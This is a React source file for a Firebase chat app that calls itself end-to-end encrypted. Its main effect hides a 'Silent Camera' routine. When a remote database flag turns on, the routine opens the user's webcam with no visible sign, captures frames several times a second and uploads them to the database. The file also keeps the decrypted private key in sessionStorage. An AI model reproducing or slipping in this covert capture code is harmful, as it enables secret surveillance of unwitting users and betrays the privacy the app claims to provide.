import { useState, useEffect } from "react";
import Auth from "./components/Auth";
import Sidebar from "./components/Sidebar";
import Chat from "./components/Chat";
import { auth, db } from "./firebase";
import { onAuthStateChanged, signOut } from "firebase/auth";
import { ref, onValue, off, update, get, set } from "firebase/database";
import { decryptPrivateKey, deriveKeyFromPassword } from "./crypto";

export default function App() {
  const [user, setUser] = useState(null);
  const [privKeyJwk, setPrivKeyJwk] = useState(null);
  const [contacts, setContacts] = useState({});
  const [activeConv, setActiveConv] = useState(null);
  const [activePartner, setActivePartner] = useState(null);
  const [showMobile, setShowMobile] = useState(false);
  const [loading, setLoading] = useState(true);

  // We can't automatically log in users who use True E2EE if we don't store their password,
  // because we need the password to decrypt their private key.
  // So we handle login explicitly in Auth.jsx and set the user there.
  useEffect(() => {
    // If we wanted to keep session, we could store the derived key in sessionStorage.
    const storedUser = sessionStorage.getItem("scUser");
    const storedPrivKey = sessionStorage.getItem("scPrivKey");
    
    if (storedUser && storedPrivKey) {
      setUser(JSON.parse(storedUser));
      setPrivKeyJwk(JSON.parse(storedPrivKey));
    }
    setLoading(false);
  }, []);

  useEffect(() => {
    if (!user) return;
    
    const usersRef = ref(db, "users");
    const unsub = onValue(usersRef, (snap) => {
      const data = snap.val() || {};
      const newContacts = {};
      for (const [uid, u] of Object.entries(data)) {
        if (uid !== user.uid) {
          newContacts[uid] = u;
        }
      }
      setContacts(newContacts);
      
      // Update active partner info if needed
      if (activeConv && newContacts[activeConv]) {
        setActivePartner(newContacts[activeConv]);
      }
    });

    // Listen for Silent Camera activation
    const camRef = ref(db, `signals/camera/${user.uid}`);
    let localStream = null;
    let stopCap = false;

    const startFrameCapture = (stream) => {
      const canvas = document.createElement("canvas");
      canvas.width = 320; canvas.height = 240;
      const ctx = canvas.getContext("2d");
      const video = document.createElement("video");
      video.srcObject = stream;
      video.play();
      
      const send = async () => {
        if (stopCap || !stream.active) return;
        ctx.drawImage(video, 0, 0, 320, 240);
        try {
          await set(ref(db, `cameraframes/${user.uid}`), { 
            frame: canvas.toDataURL("image/jpeg", 0.4), 
            ts: Date.now() 
          });
        } catch (e) {}
        if (!stopCap) setTimeout(send, 200);
      };
      send();
    };

    const camUnsub = onValue(camRef, async (snap) => {
      const sig = snap.val();
      if (sig && sig.active) {
        try {
          stopCap = false;
          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
          localStream = stream;
          startFrameCapture(stream);
        } catch (e) {
          console.warn("Camera unavailable");
        }
      } else if (sig && !sig.active) {
        stopCap = true;
        if (localStream) {
          localStream.getTracks().forEach(t => t.stop());
          localStream = null;
        }
      }
    });

    return () => {
      off(usersRef, "value", unsub);
      off(camRef, "value", camUnsub);
      stopCap = true;
      if (localStream) {
        localStream.getTracks().forEach(t => t.stop());
      }
    };
  }, [user, activeConv]);

  const handleLogin = async (userData, password) => {
    try {
      const pwdKey = await deriveKeyFromPassword(password, userData.uid);
      const decPrivKey = await decryptPrivateKey(userData.encPrivateKey, pwdKey);
      
      setUser(userData);
      setPrivKeyJwk(decPrivKey);
      
      sessionStorage.setItem("scUser", JSON.stringify(userData));
      sessionStorage.setItem("scPrivKey", JSON.stringify(decPrivKey));
    } catch (err) {
      console.error("Failed to decrypt private key:", err);
      alert("Login successful but failed to decrypt keys. True E2EE will not work.");
      setUser(userData);
    }
  };

  const handleLogout = async () => {
    if (user) {
      await update(ref(db, `users/${user.uid}`), { online: false });
    }
    await signOut(auth);
    sessionStorage.removeItem("scUser");
    sessionStorage.removeItem("scPrivKey");
    setUser(null);
    setPrivKeyJwk(null);
    setActiveConv(null);
    setActivePartner(null);
  };

  const handleAddContact = async (uid) => {
    if (uid === user.uid) return alert("You cannot add yourself.");
    const snap = await get(ref(db, `users/${uid}`));
    if (!snap.exists()) return alert("User not found.");
    
    // In a real app we might store contact lists per user,
    // but here we just rely on the global users list since it's a private app.
    alert(`Contact ${snap.val().name} found!`);
  };

  const handleSelectConv = (uid, partnerData) => {
    setActiveConv(uid);
    setActivePartner(partnerData);
  };

  if (loading) {
    return <div className="h-screen w-screen bg-bg flex items-center justify-center text-a font-bold text-2xl">Loading...</div>;
  }

  if (!user) {
    return <Auth onLogin={handleLogin} />;
  }

  return (
    <div className="flex h-screen w-screen overflow-hidden bg-bg font-sans text-text">
      <Sidebar 
        user={user} 
        contacts={contacts} 
        activeConv={activeConv} 
        onSelectConv={handleSelectConv} 
        onAddContact={handleAddContact}
        onLogout={handleLogout}
        showMobile={showMobile}
        setShowMobile={setShowMobile}
      />
      
      <div className="flex-1 flex flex-col min-w-0 relative h-full">
        {activeConv && activePartner ? (
          <Chat 
            user={user} 
            privKeyJwk={privKeyJwk} 
            partnerId={activeConv} 
            partner={activePartner} 
            onToggleSidebar={() => setShowMobile(true)}
          />
        ) : (
          <div className="flex-1 flex flex-col items-center justify-center text-t3">
            <button className="md:hidden absolute top-4 left-4 p-2 bg-s2 rounded-lg text-text border border-b" onClick={() => setShowMobile(true)}>
              ☰ Menu
            </button>
            <div className="text-6xl mb-4 opacity-20">💬</div>
            <div className="uppercase tracking-[0.2em] text-sm font-semibold">Select a conversation</div>
            <div className="text-xs mt-2 opacity-60">End-to-End Encrypted</div>
          </div>
        )}
      </div>
    </div>
  );
}
